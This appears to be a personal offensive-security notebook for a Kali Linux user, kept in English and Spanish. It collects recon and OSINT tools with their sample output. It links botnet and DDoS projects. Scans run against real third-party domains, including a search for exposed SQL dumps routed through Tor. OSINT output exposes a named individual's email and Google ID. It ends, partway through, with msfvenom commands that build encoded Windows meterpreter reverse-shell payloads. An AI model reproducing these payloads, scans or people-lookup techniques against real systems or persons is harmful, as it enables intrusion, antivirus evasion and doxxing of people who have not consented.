     \__ \ |_| | | |) |  |_ \ .` | |_| | |\/| |
     |___/\___/|_|___/  |___/_|\_|\___/|_|  |_|  twitter@syed__umar

    [#] Finding/Listing all SUID Binaries ..
    ------------------------------
    /opt/google/chrome/chrome-sandbox
    /usr/lib/dbus-1.0/dbus-daemon-launch-helper                                                                                                                                                               
    /usr/lib/openssh/ssh-keysign                                                                                                                                                                              
    /usr/lib/xorg/Xorg.wrap                                                                                                                                                                                   
    /usr/lib/chromium/chrome-sandbox                                                                                                                                                                          
    /usr/bin/kismet_cap_linux_bluetooth                                                                                                                                                                       
    /usr/bin/vmware-user-suid-wrapper                                                                                                                                                                         
    /usr/bin/gpasswd                                                                                                                                                                                          
    /usr/bin/su                                                                                                                                                                                               
    /usr/bin/kismet_cap_ti_cc_2531                                                                                                                                                                            
    /usr/bin/ntfs-3g                                                                                                                                                                                          
    /usr/bin/pkexec                                                                                                                                                                                           
    /usr/bin/chsh                                                                                                                                                                                             
    /usr/bin/chfn                                                                                                                                                                                             
    /usr/bin/kismet_cap_nrf_mousejack                                                                                                                                                                         
    /usr/bin/ksu                                                                                                                                                                                              
    /usr/bin/sudo                                                                                                                                                                                             
    /usr/bin/kismet_cap_nrf_51822                                                                                                                                                                             
    /usr/bin/kismet_cap_ti_cc_2540                                                                                                                                                                            
    /usr/bin/passwd                                                                                                                                                                                           
    /usr/bin/kismet_cap_linux_wifi                                                                                                                                                                            
    /usr/bin/kismet_cap_nxp_kw41z                                                                                                                                                                             
    /usr/bin/kismet_cap_rz_killerbee                                                                                                                                                                          
    /usr/bin/kismet_cap_nrf_52840                                                                                                                                                                             
    /usr/bin/mount                                                                                                                                                                                            
    /usr/bin/kismet_cap_ubertooth_one                                                                                                                                                                         
    /usr/bin/newgrp                                                                                                                                                                                           
    /usr/bin/umount                                                                                                                                                                                           
    /usr/bin/fusermount3                                                                                                                                                                                      
    /usr/share/atom/chrome-sandbox                                                                                                                                                                            
    /usr/share/discord-canary/chrome-sandbox                                                                                                                                                                  
    /usr/libexec/polkit-agent-helper-1                                                                                                                                                                        
    /usr/sbin/mount.nfs                                                                                                                                                                                       
    /usr/sbin/mount.cifs                                                                                                                                                                                      
    /usr/sbin/pppd                                                                                                                                                                                            
    /usr/sbin/exim4                                                                                                                                                                                           
    ------------------------------                                                                                                                                                                            


    [!] Default Binaries (Don't bother)                                                                                                                                                                       
    ------------------------------                                                                                                                                                                            
    /opt/google/chrome/chrome-sandbox                                                                                                                                                                         
    /usr/lib/dbus-1.0/dbus-daemon-launch-helper                                                                                                                                                               
    /usr/lib/openssh/ssh-keysign                                                                                                                                                                              
    /usr/lib/xorg/Xorg.wrap                                                                                                                                                                                   
    /usr/lib/chromium/chrome-sandbox                                                                                                                                                                          
    /usr/bin/vmware-user-suid-wrapper                                                                                                                                                                         
    /usr/bin/gpasswd                                                                                                                                                                                          
    /usr/bin/su                                                                                                                                                                                               
    /usr/bin/ntfs-3g                                                                                                                                                                                          
    /usr/bin/pkexec                                                                                                                                                                                           
    /usr/bin/chsh                                                                                                                                                                                             
    /usr/bin/chfn                                                                                                                                                                                             
    /usr/bin/sudo                                                                                                                                                                                             
    /usr/bin/passwd                                                                                                                                                                                           
    /usr/bin/mount                                                                                                                                                                                            
    /usr/bin/newgrp                                                                                                                                                                                           
    /usr/bin/umount                                                                                                                                                                                           
    /usr/share/atom/chrome-sandbox                                                                                                                                                                            
    /usr/share/discord-canary/chrome-sandbox                                                                                                                                                                  
    /usr/libexec/polkit-agent-helper-1                                                                                                                                                                        
    /usr/sbin/mount.nfs                                                                                                                                                                                       
    /usr/sbin/mount.cifs                                                                                                                                                                                      
    /usr/sbin/pppd                                                                                                                                                                                            
    /usr/sbin/exim4                                                                                                                                                                                           
    ------------------------------                                                                                                                                                                            


    [~] Custom SUID Binaries (Interesting Stuff)                                                                                                                                                              
    ------------------------------                                                                                                                                                                            
    /usr/bin/kismet_cap_linux_bluetooth                                                                                                                                                                       
    /usr/bin/kismet_cap_ti_cc_2531                                                                                                                                                                            
    /usr/bin/kismet_cap_nrf_mousejack                                                                                                                                                                         
    /usr/bin/ksu                                                                                                                                                                                              
    /usr/bin/kismet_cap_nrf_51822                                                                                                                                                                             
    /usr/bin/kismet_cap_ti_cc_2540                                                                                                                                                                            
    /usr/bin/kismet_cap_linux_wifi                                                                                                                                                                            
    /usr/bin/kismet_cap_nxp_kw41z                                                                                                                                                                             
    /usr/bin/kismet_cap_rz_killerbee                                                                                                                                                                          
    /usr/bin/kismet_cap_nrf_52840                                                                                                                                                                             
    /usr/bin/kismet_cap_ubertooth_one                                                                                                                                                                         
    /usr/bin/fusermount3                                                                                                                                                                                      
    ------------------------------                                                                                                                                                                            


    [#] SUID Binaries found in GTFO bins..                                                                                                                                                                    
    ------------------------------                                                                                                                                                                            
    [!] None :(                                                                                                                                                                                               
    ------------------------------                                                                                                                                                                            


# Build your own bot framework

    Follow these instructions, https://github.com/malwaredllc/byob/wiki/Running-Web-GUI-in-a-Docker-container
    build the container, run it, go to 0.0.0.0:5000 in browser.

# DDOS scripts. Do not use them!

    https://github.com/IkzCx/ProgramsForDDos

# Wifi wardriving

    I modified a bit s4vitar`s version. I have an alfa awu0360h

    https://gist.github.com/alonsoir/ebb659ceb939700f577caf33b512d23b

    https://gist.github.com/

    sudo ./s4viPwnWifi.sh -a  PKMID -n wlan0

    airgeddon

    https://github.com/v1s1t0r1sh3r3/airgeddon

# Commands to hack some web vulnerability

    https://gist.github.com/alonsoir/dff9e961ed090464808e9018080ea6fe   

    https://www.youtube.com/watch?v=ggkUREL6djQ&t=4321s

# OSINT

    # Discover

        https://github.com/leebaird/discover

    Custom bash scripts used to automate various penetration testing tasks including recon, scanning,
    enumeration, and malicious payload creation using Metasploit. For use with Kali Linux.

# Facebook

    TODO

# Twitter

    https://accountanalysis.app/

# Instagram

    TODO

    osintgram...

# Telegram

     # eu: Tlgrm.eu/channels provides the most comprehensive directory of channels from across the platform. Enter the name of the group you’re looking for or some related keywords. If Tlgrm.eu has indexed the page, it will show up in the results.

        https://tlgrm.eu/channels

     # Lyzem: Lyzem is a search engine created specifically for Telegram. The tool allows you to search for conversations that mention specific key phrases. Analysts can also use Lyzem to uncover public channels, groups, and users. Useful for corporate analysts who work for organizations that forbid them from creating an account on the site.

        https://lyzem.com

     # io: IntelX.io has a handy search engine for uncovering content on Telegram. Type a keyword or series of related phrases into the search bar. The query will then return related information from Telegram channels, users, groups, or bots.

        https://intelx.io/tools?tab=telegram

     # Google search for usernames: A simple Google query can often uncover usernames for people of interest. Enter ‘https://t.me/username into the search bar. If Google has indexed their page, it might pop up in the results.

     # Google search for invite links: To join most channels on Telegram, you will need an invite link from an existing member. Thankfully, users often share these links on other forums or websites. You can uncover these invitations by searching Google for ‘https://t.me/joinchat/<hast value>. It’s also helpful to include a few keywords into the search query related to the types of channels and communities you want to find.

     # db: Telegram Database allows users to search the platform for public channels, groups, or bots.

        https://t.me/tgdatabase

# free email

    https://www.mailinator.com/v4/public/inboxes.jsp?vfpshow=true

# Recon web sites, passive

    https://www.robtex.com/dashboard/

    https://www.zoomeye.org (china) es muy parecida a shodan, pero permite introducir la version, se ve el contenido completo del html...

    https://fofa.info (china)

    http://shodan.io

    https://www.shodan.io/dashboard?language=en

    http://censys.io

    https://search.censys.io/

    http://mrlooquer.com

    http://onyphe.io

    http://oshadan.com (cómo creo la cuenta?)

    http://viz.greynoise.io

    http://ivre.rocks

    http://app.binaryedge.io

# Recon web sites, semippassives

    https://start.me/p/rx6Qj8/nixintel-s-osint-resource-list

    https://github.com/cipher387/osint_stuff_tool_collection

    https://www.brigadaosint.com

    https://esgeeks.com

    https://github.com/AhmedConstant/lazyGrandma

    https://zmap.io

    https://www.hackplayers.com/?m=1

# Fail2ban

  scans log files (e.g. /var/log/apache/error_log) and bans IPs that show the malicious signs -- too many password failures, seeking for exploits, etc. Generally Fail2Ban is then used to update firewall rules to reject the IP addresses for a specified amount of time, although any arbitrary other action (e.g. sending an email) could also be configured. Out of the box Fail2Ban comes with filters for various services (apache, courier, ssh, etc).

  Fail2Ban is able to reduce the rate of incorrect authentications attempts however it cannot eliminate the risk that weak authentication presents. Configure services to use only two factor or public/private authentication mechanisms if you really want to protect services.

  https://www.fail2ban.org/wiki/index.php/Main_Page

# subwalker, searching subdomains

    https://github.com/m8sec/SubWalker

    > ./subwalker.sh northernrich.com
    [*] Executing SubWalker against: northernrich.com
    [*] Launching SubScraper
    [*] Launching Sublist3r
    [*] Launching assetfinder
    [*] Waiting until all scripts complete...
    cat: subscraper.txt: No such file or directory
    cat: sublist3r.txt: No such file or directory
    rm: cannot remove 'subscraper.txt': No such file or directory
    rm: cannot remove 'sublist3r.txt': No such file or directory

    [+] SubWalker complete with 4 results
    [+] Output saved to: /home/kali/git/subwalker/subwalker.txt
    > cat subwalker.txt
    mail.northernrich.com
    northernrich.com
    ns.northernrich.com
    www.northernrich.com

# Subscraper, searching subdomains

    https://github.com/m8sec/subscraper

    > subscraper --all --censys-id someId --censys-secret blablebliblobluxD northernrich.com

         ___      _    ___                                                                                                                                                                                    
        / __|_  _| |__/ __| __ _ _ __ _ _ __  ___ _ _                                                                                                                                                         
        \__ \ || | '_ \__ \/ _| '_/ _` | '_ \/ -_) '_|                                                                                                                                                        
        |___/\_,_|_.__/___/\__|_| \__,_| .__/\___|_| v3.0.2                                                                                                                                                   
                                       |_|           @m8r0wn

                                       / 4 Subdomains Found.
    [*] Identified 4 subdomain(s) in 0:00:36.093118.
    [*] Subdomains written to ./subscraper_report.txt.
    > cat ./subscraper_report.txt
    www.northernrich.com
    mail.northernrich.com
    ns.northernrich.com
    ftp.northernrich.com

# Subfinder,  searching subdomains

    https://www.kali.org/tools/subfinder/

    > proxychains subfinder -d as.com -silent
    [proxychains] config file found: /etc/proxychains.conf
    [proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
    [proxychains] DLL init: proxychains-ng 4.16
    ...    
    playertop-meristation.as.com
    singapore.as.com

     ⭐  ~  ok  took 31s  at 12:44:23 >  

# httpx

    https://github.com/projectdiscovery/httpx

# subfinder and httpx anonimizado por Tor usando proxychains. Buscando ficheros mysql.sql en subdominios.

    > proxychains subfinder -d as.com -silent | httpx silent -path "/wp-content/mysql.sql" -mC 200 -t 250 -ports 80,443,8080,8443
    [proxychains] config file found: /etc/proxychains.conf
    [proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
    [proxychains] DLL init: proxychains-ng 4.16

        __    __  __       _  __
       / /_  / /_/ /_____ | |/ /
      / __ \/ __/ __/ __ \|   /
     / / / / /_/ /_/ /_/ /   |
    /_/ /_/\__/\__/ .___/_/|_|
                 /_/              v1.2.0

                    projectdiscovery.io

    Use with caution. You are responsible for your actions.
    Developers assume no liability and are not responsible for any misuse or damage.
    ...
    http://seguro.meristation.as.com
    http://www.meristation.as.com

     ⭐  ~  ok  took 1m 20s  at 12:35:15 >                                                                                     

# spiderfoot.

    Next command will run a server in localhost 5001 port. Deep scan. In my personal case, i have to run it with sudo.

    python3 ./sf.py -l 127.0.0.1:5001

    https://github.com/smicallef/spiderfoot

# s1c0n

    https://github.com/root-x-krypt0n-x/s1c0n

    > sudo python3 sicon.py -u as.com

                  ┏━┓╺┓ ┏━╸┏━┓┏┓╻
                  ┗━┓ ┃ ┃  ┃┃┃┃┗┫
                  ┗━┛╺┻╸┗━╸┗━┛╹ ╹

                    Simple Recon
                Coded by UnknownSec666
                   Thanks to: Jeager

        [*] Starting recon on as.com:

          [+] WAF: NOT DETECTED

          [+] OPENED PORTS: 2
            -> 80/tcp  open  http
            -> 443/tcp open  https

          [+] SUBDOMAINS DETECTED: 194
            -> xn--90as.com | [80, 113, 443, 2000, 5060, 8008]
            -> telegra.ph | [80, 113, 443, 2000, 5060, 8008]
            -> www.mail.megastore.as.com | FAIL MAYBE HOST DIED
            -> my.as.com | [80, 443]
            -> seuglucmachespti.tk | [80, 443, 8080, 8443]
            -> meristation.as.com | [80]
            -> 2fmeristation.as.com | FAIL MAYBE HOST DIED
            -> backend.meristation.as.com | [80]
            -> parrillatv.api.as.com | FAIL MAYBE HOST DIED
            -> www.toogas.com | [80, 443, 8080, 8443]
            -> dy6.jgdy99.com | [80, 113, 443, 2000, 5060, 8008, 8080, 8443]
            -> serielistas.as.com | [80, 443]
            -> entradas.as.com | [80, 443]
            -> as.com | [80, 443]
            -> colombia.as.com | [80, 443]
            -> be.as.com | FAIL MAYBE HOST DIED
            -> *.resultados.as.com | FAIL MAYBE HOST DIED
            -> api.preferences.as.com | [80, 443]
            -> www.ultra--as.com | FAIL MAYBE HOST DIED
            -> sdmedia.as.com | [80, 443]
            -> fan.as.com | [80, 443]
            -> login.meristation.as.com | [80]

# Web scrapper

    https://github.com/m8sec/pymeta

    > pymeta -d as.com -s all -f as.com.csv

    [*] Starting PyMeta web scraper
    [*] Extension  |  Number of New Files Found  |  Search URL
    [!] Captcha'ed by google: Skipping this source...
    [*] pdf :  0 http://www.bing.com/search?q=site:as.com%20filetype:pdf&first=0
    [*] xls :  0 http://www.bing.com/search?q=site:as.com%20filetype:xls&first=0
    [*] xlsx:  0 http://www.bing.com/search?q=site:as.com%20filetype:xlsx&first=0
    [*] csv :  0 http://www.bing.com/search?q=site:as.com%20filetype:csv&first=0
    [*] doc :  2 http://www.bing.com/search?q=site:as.com%20filetype:doc&first=0
    [*] doc :  0 http://www.bing.com/search?q=site:as.com%20filetype:doc&first=34
    [*] docx:  0 http://www.bing.com/search?q=site:as.com%20filetype:docx&first=0
    [*] ppt :  0 http://www.bing.com/search?q=site:as.com%20filetype:ppt&first=0
    [*] pptx:  0 http://www.bing.com/search?q=site:as.com%20filetype:pptx&first=0
    [*] Downloading 2 files to: ./as.c_meta2/
    [*] Extracting Metadata...
    [*] Adding source URL's to the report
    [+] Report complete: as.com.csv


    # Set of osint websites

    https://osint.hopain.cyou/Domain.html

    # Searching in Linkedin...

    https://github.com/m8sec/CrossLinked

    > python3 crosslinked.py -f '{first}.{last}@sopra.com' "sopra steria"

         _____                    _             _            _                                                                                                                                                
        /  __ \                  | |   (x)     | |          | |                                                                                                                                               
        | /  \/_ __ ___  ___ ___ | |    _ _ __ | | _____  __| |                                                                                                                                               
        | |   | '__/ _ \/ __/ __|| |   | | '_ \| |/ / _ \/ _` |                                                                                                                                               
        | \__/\ | | (_) \__ \__ \| |___| | | | |   <  __/ (_| |                                                                                                                                               
         \____/_|  \___/|___/___/\_____/_|_| |_|_|\_\___|\__,_| v0.1.0                                                                                                                                        

        @m8r0wn                                                                                                                                                                                               

    [*] Searching google for valid employee names at "sopra steria"
    [!] No results found
    [*] Searching bing for valid employee names at "sopra steria"
    [...
    [+] 90 unique names added to names.txt!
    > cat names.txt
    ...

    # PyWhat. Identify what something is, online. Use it with pcap files, btc adresses,...

    https://reconshell.com/pywhat-identify-anything/

    https://github.com/bee-san/pyWhat

    # Basilisk. It uses shodan api to find vulnerable camaras.

    https://github.com/spicesouls/basilisk

    https://epieos.com provide an email to get data.

    https://github.com/lulz3xploit/LittleBrother todo!

    https://github.com/tgscan/tgscan-data

    # Iky -> pretty amazing. Provide an email and get data!

    https://kennbroorg.gitlab.io/ikyweb/

    Run redis-server first

    go to folder backend and run the script with sudo

    sudo python app.py -e prod

    https://gitlab.com/kennbroorg/iKy/blob/iKy/README.md

    http://127.0.0.1:4200/pages/apikeys

    # OSRF framework, set of tools

    https://github.com/i3visio/osrframework

    # Phone numbers search, phoneinfoga

    https://github.com/sundowndev/phoneinfoga

    just type in terminal phoneinfoga serve

    a gui will be open in localhost:5000

    # Osintgram (Instagram)

    https://github.com/Datalux/Osintgram

    clone the project, run the next commands to create the docker container:

    docker build -t osintgram .

    make setup -> put your credentials

    make run -> execute

    It has some workarounds the moment i tried, but it looks interesting

    # xeuledoc

    Fetch information about any public Google document.

    https://github.com/Malfrats/xeuledoc

    > xeuledoc  https://docs.google.com/document/d/1if1Fq_pcHAP0RYla-lsuAI-7BwWL7yCR9nWp8yU1k6M/edit
    Twitter : @MalfratsInd
    Github : https://github.com/Malfrats/xeuledoc

    Document ID : 1if1Fq_pcHAP0RYla-lsuAI-7BwWL7yCR9nWp8yU1k6M

    [+] Creation date : 2020/10/27 21:51:56 (UTC)
    [+] Last edit date : 2020/11/17 10:15:03 (UTC)

    Public permissions :
    - reader
    [+] You have special permissions :
    - reader
    - commenter

    [+] Owner found !

    Name : Samantha Menot
    Email : samantha.menot@databricks.com
    Google ID : 15790401968530511716

    # Dante's Gate -> set of tools. It has a lot of errors, probably it is a non maintained version...

    https://github.com/Quantika14/osint-suite-tools

    > pwd
    /home/kali/git/osint-suite-tools
    > ls
    bots               BuscadorNick.py            BuscadorPersonas.py   data     modules      README.md         search_engines
    BuscadorEmails.py  BuscadorNoticiasFalsas.py  BuscadorTelefonos.py  LICENSE  __pycache__  requiriments.txt  targets.txt
    > sudo python3 -m BuscadorPersonas
    [sudo] password for kali:


            T U T I O W Y M V R M D Y I H C H A S E Q G P L 3 W 5 K G X 9 B 0
            R X D A N T E ' S   G A T E S   M I N I M A L   V E R S I O N K 2
            5 3 J I T 7 Q Y Q L D M S K Y H L N A W C O M H B C O 9 I N A K G

            Jorge Coronado (aka @JorgeWebsec)
            01.06.02


          ____________________________________________________________________________________________________

          Discleimer: This application allows you to create intelligence through open sources.
          You do not access information that is not public. The author is not responsible for its use.
          ____________________________________________________________________________________________________

          Description: Dante's Gates Minimal Version is an open application with a GNU license for OSINT with
          Spanish and international sources. Currently it is maintained by Jorge Coronado and there are other
          versions such as mobile and APIs for your applications.
          ----
          Important: the author of this software is not responsible for it's use. The App aims to help
          researchers in OSINT, not to do evil. For more information contact the author.


    None
    __________________________________________________
    | 1. Name, surnames  and DNI                     |
    | 2. Search names and surnames in list           |
    |________________________________________________|

    Select 1/2/3:

    # more tools, creators of Dante's Gate

    https://github.com/Quantika14

    # Gephi (installed in osx...) TODO

    https://gephi.org/users/download/

    # Blockchain explorer

    https://www.blockchain.com/explorer

    # Spiderfoot -> TODO

    https://github.com/smicallef/spiderfoot?ref=d

    set api keys -> todo

    https://sf-e3814fe.hx.spiderfoot.net/optsapi

    # TrueCaller -> spam teléfonico

    https://www.truecaller.com

# Passive collection of information:

    1) google dorks! ->

        https://github.com/m3n0sd0n4ld/GooFuzz -> TODO

        https://www.hackingloops.com/google-dorks/

        https://cheatsheet.haax.fr/open-source-intelligence-osint/dorks/google_dorks/

        Understanding Google Dorks Operators:

        intitle – This allows a hacker to search for pages with specific text in their HTML title.
        So intitle: “login page” will help a hacker scour the web for login pages.

        allintitle – Similar to the previous operator, but only returns results for pages that meet all of the keyword criteria.

        inurl – Allows a hacker to search for pages based on the text contained in the URL (i.e., “login.php”).

        allinurl – Similar to the previous operator, but only returns matches for URLs that meet all the matching criteria.

        filetype – Helps a hacker narrow down search results to specific files such as PHP, PDF, or TXT file types.

        ext – Very similar to filetype, but this looks for files based on their file extension.

        intext – This operator searches the entire content of a given page for keywords supplied by the hacker.

        allintext – Similar to the previous operator but requires a page to match all of the given keywords.

        site – Limits the scope of a query to a single website.

    2) Shodan.io

        Fantastic search engine. Complex, it is designed to index Iot devices connected to the internet, like cameras, so on, so forth.

        the sintax is quite strict, be careful, follow the cheatsheet guide.

        https://www.shodan.io/search?query=city%3A%22Badajoz%22

        https://github.com/jakejarvis/awesome-shodan-queries

        This is a tool to find websites by calculating its favicon hash: https://github.com/phor3nsic/favicon_hash_shodan


    3) Censys.io

        https://search.censys.io

        https://github.com/thehappydinoa/awesome-censys-queries

    4) theHarvester->  Muy agresivo, google te bloquea enseguida. No se porqué a Santiago le gusta tanto.

        Habría que jugar con las opciones para ver si es menos agresivo.

        https://github.com/laramies/theHarvester

        Now it is theharvester!

        > proxychains  theharvester -d https://www.cncintel.com -g -s -v -n -b all
        [proxychains] config file found: /etc/proxychains.conf
        [proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
        [proxychains] DLL init: proxychains-ng 4.16

        *******************************************************************
        *  _   _                                            _             *
        * | |_| |__   ___    /\  /\__ _ _ ____   _____  ___| |_ ___ _ __  *
        * | __|  _ \ / _ \  / /_/ / _` | '__\ \ / / _ \/ __| __/ _ \ '__| *
        * | |_| | | |  __/ / __  / (_| | |   \ V /  __/\__ \ ||  __/ |    *
        *  \__|_| |_|\___| \/ /_/ \__,_|_|    \_/ \___||___/\__\___|_|    *
        *                                                                 *
        * theHarvester 4.0.3                                              *
        * Coded by Christian Martorella                                   *
        * Edge-Security Research                                          *
        * cmartorella@edge-security.com                                   *
        *                                                                 *                                                                                                                                          
        *******************************************************************

    5) Maltego -> powerfull, but interesting stuff is not free

    6) recon-ng

    https://www.nosolohacking.info/recon-ng-instalacion/

    7) archive.org

    8) Sherlock

    > sherlock --print-all --browse andrewmakokha575@gmail.com
    [*] Checking username andrewmakokha575@gmail.com on:
    ...
    [+] Coil: https://coil.com/u/andrewmakokha575@gmail.com
    [-] ColourLovers: Not Found!
    ...

    9) > maigret XYZ@gmail.com
    [-] Starting a search on top 500 sites from the Maigret database...
    [!] You can run search by full list of sites with flag `-a`

    maigret works with python3.8, so probably you have to activate the environment:

    conda create -m mypython3.8 ipykernel=3.8
    conda activate mypython3.8
    pip3 install maigret
    ...

    after the work, deactivate it

    conda deactivate

    10) https://whatsmyname.app/

# Semi-passive pickup:

    1) Foca. Only windows. Metadata gathering recovery tool.

    2) dnsdumpster -> https://dnsdumpster.com/

    3) centralOps -> https://centralops.net/co/

    4) whireshark -> packet sniffer

    5) tcpdump -> packet sniffer

# Active collection:

    1) dnsRecon

    dnsrecon -s -a  -f -b -y -k -w  -z  -v -t brt --db /home/kali/Desktop/work/dns-recon-sql-northernrich.file -d https://www.northernrich.com/admin -D /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --xml /home/kali/Desktop/work/dnsrecon1-northernrich.xml

    > dnsrecon -s -a  -f -b -y -k -w  -z  -v -t std --db /home/kali/Desktop/work/dns-recon-sql-northernrich.file -d https://www.northernrich.com/admin  --xml /home/kali/Desktop/work/dnsrecon1-northernrich.xml
    zsh: correct '/home/kali/Desktop/work/dnsrecon1-northernrich.xml' to '/home/kali/Desktop/work/dnsrecon-northernrich.xml' [nyae]? n
    [*] std: Performing General Enumeration against: https://www.northernrich.com/admin...
    [*] Checking for Zone Transfer for https://www.northernrich.com/admin name servers
    [*] Resolving SOA Record
    [*] Resolving NS Records
    [*] NS Servers found:
    [*] Removing any duplicate NS server IP Addresses...
    [*] Checking for Zone Transfer for https://www.northernrich.com/admin name servers
    [*] Resolving SOA Record
    [*] Resolving NS Records
    [*] NS Servers found:
    [*] Removing any duplicate NS server IP Addresses...
    [*] Saving records to XML file: /home/kali/Desktop/work/dnsrecon1-northernrich.xml
    [*] Saving records to SQLite3 file: /home/kali/Desktop/work/dns-recon-sql-northernrich.file

    > dnsrecon -d www.northernrich.com -D /usr/share/wordlists/dnsmap.txt -t std --xml /home/kali/Desktop/work/dnsrecon-northernrich.xml
    [*] std: Performing General Enumeration against: www.northernrich.com...
    [-] DNSSEC is not configured for www.northernrich.com
    [*]      SOA ns.northernrich.com 150.107.31.61
    [*]      NS ns.northernrich.com 150.107.31.61
    [*]      MX mail.northernrich.com 150.107.31.61
    [*]      CNAME www.northernrich.com northernrich.com
    [*]      A northernrich.com 150.107.31.61
    [*]      TXT www.northernrich.com v=spf1 a mx ip4:150.107.31.61 ~all
    [*] Enumerating SRV Records
    [+] 0 Records Found
    [*] Saving records to XML file: /home/kali/Desktop/work/dnsrecon-northernrich.xml


    2) nmap

    3) amap
    ...    
    amap v5.4 (www.thc.org/thc-amap) started at 2022-07-01 11:21:02 - APPLICATION MAPPING mode

    Total amount of tasks to perform in plain connect mode: 23
    DEBUG: probing now trigger http (1) on 150.107.31.61:443/tcp
    DEBUG: probing now trigger ssl (1) on 150.107.31.61:443/tcp
    DEBUG: probing now trigger ms-remote-desktop-protocol (1) on 150.107.31.61:443/tcp
    DEBUG: probing now trigger netbios-session (3) on 150.107.31.61:443/tcp
    DEBUG: probing now trigger netbios-session (1) on 150.107.31.61:443/tcp
    DEBUG: probing now trigger ms-ds (1) on 150.107.31.61:443/tcp
    DEBUG: probing now trigger smtp (1) on 150.107.31.61:443/tcp
    DEBUG: probing now trigger ftp (1) on 150.107.31.61:443/tcp
    DEBUG: probing now trigger rpc (1) on 150.107.31.61:443/tcp
    DEBUG: probing now trigger dns (1) on 150.107.31.61:443/tcp
    DEBUG: probing now trigger ldap (1) on 150.107.31.61:443/tcp
    DEBUG: probing now trigger oracle-tns-listener (1) on 150.107.31.61:443/tcp
    DEBUG: probing now trigger x-windows (1) on 150.107.31.61:443/tcp
    DEBUG: probing now trigger sap-r3 (1) on 150.107.31.61:443/tcp
    DEBUG: probing now trigger ms-sql (1) on 150.107.31.61:443/tcp
    DEBUG: probing now trigger jrmi (1) on 150.107.31.61:443/tcp
    DEBUG: probing now trigger nessus (1) on 150.107.31.61:443/tcp
    DEBUG: probing now trigger webmin (1) on 150.107.31.61:443/tcp
    DEBUG: probing now trigger db2 (1) on 150.107.31.61:443/tcp
    DEBUG: probing now trigger jinilookupservice (1) on 150.107.31.61:443/tcp
    DEBUG: probing now trigger slp (1) on 150.107.31.61:443/tcp
    DEBUG: probing now trigger tivoli_tsm-server (1) on 150.107.31.61:443/tcp
    DEBUG: probing now trigger norman-njeeves (1) on 150.107.31.61:443/tcp
    Waiting for timeout on 23 connections ...
    Protocol on 150.107.31.61:443/tcp (by trigger http) matches http
    Protocol on 150.107.31.61:443/tcp (by trigger http) matches http-apache-2
    Protocol on 150.107.31.61:443/tcp (by trigger ssl) matches ssl


    4) masscan -> scan the internet! Literally, you can scan the whole internet if you have time...

    root@kali:~# masscan -p22,80,445 192.168.1.0/24

    Starting masscan 1.0.3 (http://bit.ly/14GZzcT) at 2014-05-13 21:35:12 GMT
     -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
    Initiating SYN Stealth Scan
    Scanning 256 hosts [3 ports/host]
    Discovered open port 22/tcp on 192.168.1.217
    Discovered open port 445/tcp on 192.168.1.220
    Discovered open port 80/tcp on 192.168.1.230

# Vulnerability scan:

    1) CVE,CPE,CVSS -> https://cve.mitre.org/

    2) nmap

    3) nessus

    sudo systemctl start nessusd && systemctl --no-pager status nessusd

    > sudo systemctl status nessusd

    ● nessusd.service - The Nessus Vulnerability Scanner
         Loaded: loaded (/lib/systemd/system/nessusd.service; disabled; vendor preset: disabled)
         Active: active (running) since Fri 2022-07-01 12:41:42 CEST; 3min 20s ago
       Main PID: 27467 (nessus-service)
          Tasks: 15 (limit: 4589)
         Memory: 1.0G
            CPU: 20.892s
         CGroup: /system.slice/nessusd.service
                 ├─27467 /opt/nessus/sbin/nessus-service -q
                 └─27469 nessusd -q

    Jul 01 12:41:42 kali systemd[1]: Started The Nessus Vulnerability Scanner.
    Jul 01 12:41:55 kali nessus-service[27469]: Cached 240 plugin libs in 67msec
    Jul 01 12:41:55 kali nessus-service[27469]: Cached 240 plugin libs in 45msec

    Then, you can go the app using this url, in my machine. Maybe you have to change that url for https://localhost:8834/#/

    https://kali:8834/#/scans/folders/my-scans

    Dont you remember user and password?

    https://docs.tenable.com/nessus/commandlinereference/Content/ChangeAUsersPassword.htm

    sudo systemctl stop nessusd

# Exploitation and hacking of hosts

    1) metasploit -> THE framework to hack and exploit.

    I did a scanning session, but it is too long, so i created a gist.

    https://gist.github.com/alonsoir/65a703f44ccbbfa7f1ef57c49e86b8de

    https://www.kali.org/tools/metasploit-framework/

    https://www.offensive-security.com/metasploit-unleashed/

    2) msfvenom -> Payload Generator and Encoder

    > msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.85.139 LPORT=33534 -i 20  -e x86/shikata_ga_nai -a x86 --platform windows -f vbs > example.vbs
    Found 1 compatible encoders
    Attempting to encode payload with 20 iterations of x86/shikata_ga_nai
    x86/shikata_ga_nai succeeded with size 381 (iteration=0)
    x86/shikata_ga_nai succeeded with size 408 (iteration=1)
    x86/shikata_ga_nai succeeded with size 435 (iteration=2)
    x86/shikata_ga_nai succeeded with size 462 (iteration=3)
    x86/shikata_ga_nai succeeded with size 489 (iteration=4)
    x86/shikata_ga_nai succeeded with size 516 (iteration=5)
    x86/shikata_ga_nai succeeded with size 543 (iteration=6)
    x86/shikata_ga_nai succeeded with size 570 (iteration=7)
    x86/shikata_ga_nai succeeded with size 597 (iteration=8)
    x86/shikata_ga_nai succeeded with size 624 (iteration=9)
    x86/shikata_ga_nai succeeded with size 651 (iteration=10)
    x86/shikata_ga_nai succeeded with size 678 (iteration=11)
    x86/shikata_ga_nai succeeded with size 705 (iteration=12)
    x86/shikata_ga_nai succeeded with size 732 (iteration=13)
    x86/shikata_ga_nai succeeded with size 759 (iteration=14)
    x86/shikata_ga_nai succeeded with size 786 (iteration=15)
    x86/shikata_ga_nai succeeded with size 813 (iteration=16)
    x86/shikata_ga_nai succeeded with size 840 (iteration=17)
    x86/shikata_ga_nai succeeded with size 867 (iteration=18)
    x86/shikata_ga_nai succeeded with size 894 (iteration=19)
    x86/shikata_ga_nai chosen with final size 894
    Payload size: 894 bytes
    Final size of vbs file: 7414 bytes
    > ls example.vbs
    example.vbs

    # Basically this commands creates a reverse_tcp windows exe app with your ip and port...

    > msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.85.139 LPORT=33534 -i 20  -e x86/shikata_ga_nai -a x86 --platform windows -f exe > example.exe
    Found 1 compatible encoders
    Attempting to encode payload with 20 iterations of x86/shikata_ga_nai
    x86/shikata_ga_nai succeeded with size 381 (iteration=0)
    x86/shikata_ga_nai succeeded with size 408 (iteration=1)
    x86/shikata_ga_nai succeeded with size 435 (iteration=2)
